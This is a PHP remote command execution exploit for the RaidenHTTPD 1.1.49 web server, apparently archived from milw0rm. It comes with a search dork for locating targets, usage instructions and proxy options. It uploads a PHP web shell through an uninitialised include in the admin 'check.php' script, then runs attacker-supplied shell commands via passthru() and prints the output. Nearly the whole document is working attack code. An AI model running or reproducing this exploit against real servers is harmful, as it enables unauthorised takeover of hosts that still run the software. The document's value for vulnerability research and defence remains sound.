#!/usr/bin/php -q -d short_open_tag=on
<?
print_r('
-----------------------------------------------------------------------------
RaidenHTTPD/1.1.49 remote commands execution exploit
by rgod rgod@autistici.org
site: http://retrogod.altervista.org
dork: Powered.by.RaidenHTTPD +intitle:index.of | inurl:raidenhttpd-admin
-johnny -GHDB
-----------------------------------------------------------------------------
');
if ($argc<3) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host cmd OPTIONS
host:      target server (ip/hostname)
cmd:       a shell command
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' 2.2.2.2 ver -P1.1.1.1:80
php '.$argv[0].' 1.1.1.1 dir /q -p81
-----------------------------------------------------------------------------
');
die;
}
/*
software site: http://www.raidenhttpd.com/en/
description: "RaidenHTTPD is a fully featured web server software for Windows 98 / Me / 2000 / XP / 2003 platforms."

explanaition: this software carries a PHP interpreter (4.4.1 version...)
and you have an administrative interface in /raidenhttpd-admin folder
but... you can have anauthorized access to some scripts in
/raidenhttpd-admin/slice folder, in check.php at line 35 u have:

...
include_once($SoftParserFileXml);	// This is the parser class.
...

$SoftParserFileXml var is not initizialized so u can include
an arbitrary uploaded temporary file or arbitrary http location

also register_globals and allow_url_fopen are enabled by default (harakiri?)

*/
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$cmd="";
$port=80;
$proxy="";
for ($i=2; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy=='') {$p="/";} else {$p='http://'.$host.':'.$port."/";}

$data ="-----------------------------7d529a1d23092a\r\n";
$data.="Content-Disposition: form-data; name=\"SoftParserFileXml\"; filename=\"suntzu\";\r\n";
$data.="Content-Type: image/jpeg;\r\n\r\n";
$data.="<?php set_time_limit(0); echo 'my_delim';passthru(\$_SERVER['HTTP_SUNTZU']);die;?>\r\n";
$data.="-----------------------------7d529a1d23092a--\r\n";
$packet ="POST ".$p."raidenhttpd-admin/slice/check.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="SUNTZU: $cmd\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Accept: text/plain\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (strstr($html,"my_delim")){
echo "exploit succeeded...\n";$temp=explode("my_delim",$html);die($temp[1]);
}
echo "exploit failed...";

?>

# milw0rm.com [2006-09-08]